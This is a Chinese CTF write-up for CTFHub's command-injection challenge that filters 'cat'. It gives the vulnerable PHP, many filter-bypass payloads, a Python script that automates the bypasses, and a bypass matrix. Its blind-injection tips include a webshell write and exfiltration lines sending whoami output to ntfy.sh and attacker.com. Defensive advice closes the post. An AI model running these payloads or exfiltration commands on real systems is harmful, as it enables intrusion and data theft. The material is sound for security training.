---
layout: post
title: CTFHub - 命令注入 过滤 cat Writeup
platform: ctfhub
date: 2026-10-23 19:48:00 +0800
categories: CTF
---

CTFHub - 命令注入 过滤 cat Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **命令注入** → 过滤 cat）
- 题型：Web
- 考点：**关键字过滤绕过**、等价命令替换、shell 字符串拼接


```text
★ 页面源码：

    <?php
    $res = FALSE;
    if (isset($_GET['ip']) && $_GET['ip']) {
        $ip = $_GET['ip'];
        $m = [];
        if (!preg_match_all("/cat/", $ip, $m)) {     // ★ 匹配到 "cat" 就拦截
            $cmd = "ping -c 4 {$ip}";
            exec($cmd, $res);
        } else {
            $res = $m;                                // 把匹配结果打印出来
        }
    }
    ?>

★ 验证过滤：

    ?ip=127.0.0.1;cat /etc/hostname
    → Array( [0] => Array( [0] => cat ) )      ❌ 被拦（显示匹配到的 "cat"）

★ 找 flag 文件（用 ls，不含 cat）：

    ?ip=127.0.0.1|ls -la /var/www/html
    → -rw-r--r-- 1 root root 42 flag_75281224129207.php     ← ★ 42 字节

    ★ 注意：过滤的是 "cat"，"flag" 没被过滤
    ★ 所以文件名里有 flag 也照样能用

★ 5 种绕过方式（全部实测成功）：

    ① more 替代        ?ip=127.0.0.1|more /var/www/html/flag_xxx.php
    ② tac 替代         ?ip=127.0.0.1|tac /var/www/html/flag_xxx.php
    ③ 反斜杠 ca\t      ?ip=127.0.0.1|ca\t /var/www/html/flag_xxx.php
    ④ 单引号 c'at'     ?ip=127.0.0.1|c'at' /var/www/html/flag_xxx.php
    ⑤ 通配符 /bin/ca?  ?ip=127.0.0.1|/bin/ca? /var/www/html/flag_xxx.php

    ★ 全部返回：<?php // ctfhub{3a5f5296fca353b9c16a35ca}

flag         : ctfhub{3a5f5296fca353b9c16a35ca}
```

二、题目分析

**① 过滤器的逻辑**

```php
if (!preg_match_all("/cat/", $ip, $m)) {
    exec("ping -c 4 {$ip}", $res);     // 没匹配到 cat → 执行
} else {
    $res = $m;                          // 匹配到了 → 拦截（打印匹配结果）
}
```

**`preg_match_all` 的返回值**：

```
匹配到 N 个 → 返回 N（大于 0）
没匹配到   → 返回 0
出错       → 返回 false

!0 = true  → 执行
!N = false → 拦截
```

**★ 逻辑本身是对的（这次没有 strpos 的 0 陷阱）。**

**② 这个过滤的两个漏洞**

**漏洞 1：只匹配字面量 `cat`（区分大小写）**

```php
preg_match_all("/cat/", ...)     // 没有 i 修饰符 → 只匹配小写
```

**所以**：

```
"cat"  → 匹配 → 拦截
"Cat"  → 不匹配（但 Linux 命令区分大小写，Cat 不存在）
"CAT"  → 不匹配（同样不存在）
```

**★ 大小写这招对"命令名"无效**（Linux 的命令是小写的），
**但可以用在别的地方**（比如路径、文件名）。

**漏洞 2：只匹配字符串，不管 shell 怎么解析**

```
过滤器看到的：  "ca\t"
shell 解析后：  "cat"        ← 反斜杠被吃掉

过滤器看到的：  "c'at'"
shell 解析后：  "cat"        ← 引号被去掉

过滤器看到的：  "/bin/ca?"
shell 解析后：  "/bin/cat"   ← ? 被通配符展开
```

**★ 这就是"过滤字符串 vs shell 解析"的鸿沟** ——
**你检查的是"字面"，shell 执行的是"解析后的结果"。**

**③ 绕过方式一：换等价命令（最简单）**

**读文件的其他命令**：

| 命令 | 效果 | 备注 |
|---|---|---|
| `cat` | 正序输出 | 被过滤 |
| **`tac`** | **倒序输出**（按行）| 单行文件看起来一样 |
| **`more`** | 分页输出 | 常用 |
| **`less`** | 分页输出 | 常用 |
| **`head`** | 前 N 行 | `head -1` |
| **`tail`** | 后 N 行 | |
| `nl` | 带行号输出 | |
| `od -c` | 八进制转储 | |
| `strings` | 提取可打印字符串 | |
| `rev` | 每行倒序 | |
| `sort` | 排序 | |
| `uniq` | 去重 | |
| `paste` | 合并 | |
| `grep .` | 匹配任意字符 | `grep . /flag` |
| `awk 1` | 打印所有行 | `awk 1 /flag` |
| `sed -n p` | 打印 | |
| `vi` / `vim` | 编辑器读 | 交互麻烦 |
| `cp` + 其他 | 复制到可访问目录 | `cp /flag /var/www/html/x.txt` |
| `base64` | Base64 编码 | 拿到后解码 |
| `xxd` | 十六进制 | |

**★ 本题用 `more` 或 `tac` 最方便。**

**④ 绕过方式二：shell 字符串拼接（保留 cat 命令）**

**（1）反斜杠**

```bash
ca\t /flag          # shell 把 \<字符> 转义 → 得到 "cat"
c\at /flag
\cat /flag
```

**★ 过滤器看到 `ca\t`（3 个字符 + 反斜杠），不匹配 "cat"；
  shell 执行时得到 `cat`。**

**（2）引号拼接**

```bash
c'at' /flag         # 单引号：shell 去掉引号 → cat
c"at" /flag         # 双引号：同上
'c'a't' /flag       # 多个引号
c""at /flag
```

**（3）变量拼接**

```bash
a=ca; b=t; $a$b /flag
a=cat; $a /flag
```

**★ 但本题是单次请求，赋值和调用要写在一起**：

```
?ip=127.0.0.1;a=ca;b=t;$a$b /flag
```

**（4）命令替换**

```bash
$(echo Y2F0 | base64 -d) /flag      # Y2F0 = "cat"
`echo ca``echo t` /flag
$(printf '\x63\x61\x74') /flag      # 十六进制 → cat
```

**（5）通配符**

```bash
/bin/ca? /flag      # ? 匹配任意单字符 → /bin/cat
/bin/ca* /flag      # * 匹配任意多字符 → /bin/cat
/???/cat /flag      # 也能用
```

**★ 通配符是 shell 在【执行前】展开的，
  过滤器看到的还是 `?` 或 `*`，不匹配 "cat"。**

**⑤ 为什么这些都能绕过**

```
核心矛盾：

    过滤器检查的是【原始字符串】
    shell 执行的是【解析后的字符串】

    这两者之间的差异，就是绕过空间

具体差异来源：
    ① 转义：\t → t
    ② 引号：'at' → at
    ③ 变量：$a → cat
    ④ 命令替换：$(echo ca) → ca
    ⑤ 通配符：ca? → cat
    ⑥ 大小写（对文件名/路径有效）
    ⑦ 编码：base64 / hex / URL
```

**★ 记住这个"鸿沟模型"，所有过滤绕过都能套用。**

三、解题步骤

**第 1 步：看源码，确认过滤规则**

```
页面底部 show_source 显示源码

    if (!preg_match_all("/cat/", $ip, $m)) {
        exec("ping -c 4 {$ip}", $res);
    }

★ 只过滤 "cat"（小写，区分大小写）
★ 其他命令、分隔符都能用
```

**第 2 步：验证过滤**

```
?ip=127.0.0.1;cat /etc/hostname
→ Array( [0] => Array( [0] => cat ) )

★ 过滤器把匹配到的 "cat" 打印出来了，说明被拦
```

**第 3 步：找 flag 文件（用 ls，不含 cat）**

```
?ip=127.0.0.1|ls -la /var/www/html
→ -rw-r--r-- 1 root root 42 flag_75281224129207.php
```

**★ 注意**：这里用 `|` 让输出干净（ping 噪音被丢掉）。

**第 4 步：用绕过方式读文件**

**方式 A：换命令（最省事）**

```
?ip=127.0.0.1|more /var/www/html/flag_75281224129207.php
→ <?php // ctfhub{3a5f5296fca353b9c16a35ca}
```

**方式 B：反斜杠**

```
?ip=127.0.0.1|ca\t /var/www/html/flag_75281224129207.php
                                    ↑
                           在浏览器/URL 里写 %5C
```

**★ 地址栏里可以直接写 `ca\t`**（浏览器会编码反斜杠）。

**方式 C：单引号**

```
?ip=127.0.0.1|c'at' /var/www/html/flag_75281224129207.php
```

**方式 D：通配符**

```
?ip=127.0.0.1|/bin/ca? /var/www/html/flag_75281224129207.php
```

**第 5 步：提交 → 通关**

---

**手工操作（浏览器）**

```
① 打开题目页面
② IP 框填：127.0.0.1|ls -la /var/www/html
③ Ping → 看到 flag 文件名
④ IP 框填：127.0.0.1|more /var/www/html/flag_75281224129207.php
⑤ Ping → 看到 flag
```

**★ 如果 `more` 不行**，依次试：

```
tac / head / tail / nl / od -c / strings / grep . 
ca\t / c'at' / /bin/ca? / /bin/ca*
```

---

**自动化脚本（批量试绕过）**

```python
import ssl, urllib.parse, urllib.request, re

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

BASE = "http://challenge-xxx:10800"
FLAG = "/var/www/html/flag_75281224129207.php"


def run(payload):
    u = BASE + "/?ip=" + urllib.parse.quote(payload, safe="")
    with urllib.request.urlopen(u, context=CTX, timeout=30) as r:
        body = r.read().decode('utf-8', 'replace')
    m = re.search(r'<pre>\s*(.*?)\s*</pre>', body, re.S)
    return (m.group(1).strip() if m else "").replace("\n", " ")


bypasses = [
    "more " + FLAG,
    "tac " + FLAG,
    "head -5 " + FLAG,
    "ca\\t " + FLAG,
    "c'at' " + FLAG,
    'c"at" ' + FLAG,
    "/bin/ca? " + FLAG,
    "/bin/ca* " + FLAG,
    "$(echo Y2F0 | base64 -d) " + FLAG,
]

for b in bypasses:
    out = run("127.0.0.1|" + b)
    ok = "ctfhub{" in out
    print("%-46s -> %s" % (b[:44], "✅ " + out[out.find("ctfhub{"):][:40] if ok else out[:60]))
```

四、延伸知识

**① 过滤关键字的绕过大全（通用）**

| 绕过方式 | 例子 | 原理 |
|---|---|---|
| **换等价物** | `cat` → `tac`/`more`/`less`/`head` | 功能相同 |
| **反斜杠** | `ca\t` | shell 转义 |
| **引号** | `c'at'`、`c"at"` | shell 去引号 |
| **变量拼接** | `a=ca;b=t;$a$b` | 变量展开 |
| **命令替换** | `$(echo Y2F0\|base64 -d)` | 执行后替换 |
| **通配符** | `/bin/ca?`、`/bin/ca*` | 文件名展开 |
| **大小写** | `CAT`（对命令无效，对路径有效）| |
| **编码** | `\x63\x61\x74`（用 printf）| |
| **拼接路径** | `/bin/./cat`、`/bin//cat` | 路径规范化 |
| **环境变量** | `$PATH` 里的 cat | |

**② 更多"读文件"的替代命令**

```bash
# 直接输出
cat /flag
tac /flag               # 倒序（每行）
more /flag
less /flag
head /flag
tail /flag
nl /flag                # 带行号
od -c /flag             # 八进制
xxd /flag               # 十六进制
strings /flag
rev /flag               # 字符倒序
sort /flag
uniq /flag
grep . /flag            # 匹配任意字符
awk 1 /flag
sed -n p /flag
paste /flag
cut -c1-100 /flag
fold /flag
fmt /flag
expand /flag
split -b 100 /flag      # 分割成文件

# 间接读
cp /flag /var/www/html/x.txt     # 复制到 Web 目录
base64 /flag                     # 编码后读
iconv -f utf-8 /flag
diff /flag /dev/null
```

**③ 命令注入的完整绕过矩阵**

| 过滤项 | 绕过方式 |
|---|---|
| **空格** | `${IFS}`、`$IFS$9`、`<`、`%09`、`{cat,/flag}` |
| **分隔符 `;`** | `%0a`、`%0d`、`\|`、`&&`、`&` |
| **`cat`** | `tac`/`more`/`ca\t`/`c'at'`/`/bin/ca?` |
| **`flag`** | `/f*`、`/fla?`、`/fl''ag`、`$(echo L2ZsYWc=\|base64 -d)` |
| **`/`** | `${PATH:0:1}`、`$(printf '\x2f')` |
| **`$()`** | 反引号 `` ` `` |
| **`|`** | `%0a`、`;` |
| **`&`** | `%0a` |
| **数字** | `$((1+1))`、`${#}`、`$(())` |
| **字母** | 引用环境变量、`$'\x63'` |

**④ 无回显（盲注）时的技巧**

**如果 `exec` 的输出没打印出来**：

```bash
# ① 时间盲注
?ip=127.0.0.1;sleep 5        → 响应慢 5 秒即成功

# ② 写文件
?ip=127.0.0.1;echo "test" > /var/www/html/x.txt
→ 访问 /x.txt 看内容

# ③ 写 webshell
?ip=127.0.0.1;echo "<?php system(\$_GET[1]);?>" > /var/www/html/x.php

# ④ 外带（HTTP）
?ip=127.0.0.1;curl http://ntfy.sh/mytopic/$(whoami|base64)
→ 看 ntfy

# ⑤ 外带（DNS）
?ip=127.0.0.1;ping -c 1 `whoami`.attacker.com
```

**⑤ 防护**

```text
① ★ 用 escapeshellarg() 包住用户输入
    exec("ping -c 4 " . escapeshellarg($_GET['ip']));
    → 输入被包在单引号里，特殊字符全部失效

② ★ 白名单校验（最安全）
    if (!filter_var($ip, FILTER_VALIDATE_IP)) die("非法 IP");
    → 只接受合法 IP 格式，无法注入

③ ★ 不用 shell，用语言内置函数
    PHP: fsockopen 代替 ping，file_get_contents 代替 curl

④ 黑名单过滤（本题的做法）→ 永远能被绕过
    ★ 过滤 "cat" → 用 tac
    ★ 过滤所有读文件命令 → 用通配符 /bin/ca*
    ★ 过滤通配符 → 用 base64 编码命令

⑤ 最小权限 + 容器隔离
```

**⑥ 一句话总结过滤绕过的哲学**

```
过滤器是"字符串匹配"
shell 是"语义解析"

两者之间的任何差异都是绕过空间：
    转义、引号、变量、替换、通配符、编码、大小写、路径规范化...

★ 所以：黑名单永远输
★ 正确做法：白名单 + escapeshellarg + 不用 shell
```

五、总结

- **本题核心：`preg_match_all("/cat/")` 只匹配字面量 → 换命令或变形即可绕过。**
- 5 种绕过（都实测成功）：

```
① |more /var/www/html/flag_xxx.php
② |tac  /var/www/html/flag_xxx.php
③ |ca\t /var/www/html/flag_xxx.php
④ |c'at' /var/www/html/flag_xxx.php
⑤ |/bin/ca? /var/www/html/flag_xxx.php
```

- **三个必记要点**：

```text
① 换命令最快：cat → tac/more/less/head/tail/nl/od/strings
② shell 会解析：反斜杠、引号、变量、通配符 —— 过滤器看不到解析结果
③ 通配符 /bin/ca? 是万能招（因为 shell 在执行前展开）
```

- **实测 flag**：

```text
ctfhub{3a5f5296fca353b9c16a35ca}
（在 /var/www/html/flag_75281224129207.php）
```

- CTFHub 命令注入系列进度：

```text
✅ 无过滤          —— ; 和 | 直接注入
✅ 过滤 cat        —— 本题：5 种绕过
⬜ 过滤空格        —— ${IFS} / < / $IFS$9
⬜ 过滤关键字      —— 通配符 / 拼接 / Base64
⬜ 过滤分隔符      —— %0a / ${IFS}
```

**手工复现要点**：

```text
· 看源码 → 确认过滤了什么（本题只过滤 cat）
· 试 ?ip=127.0.0.1;cat /etc/hostname → 被拦
· 换 more / tac → 成功
· ls -la /var/www/html → 找 flag 文件
· more 读它
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────┐
│  过滤 "cat" 的 3 类绕过：                                │
│                                                        │
│  ① 换命令：tac / more / less / head / tail / nl / od    │
│  ② 变形：  ca\t / c'at' / c"at" / /bin/ca? / /bin/ca*   │
│  ③ 生成：  $(echo Y2F0|base64 -d)                       │
│                                                        │
│  ★ 过滤器看字符串，shell 看语义 → 差异就是绕过空间        │
└────────────────────────────────────────────────────────┘
```
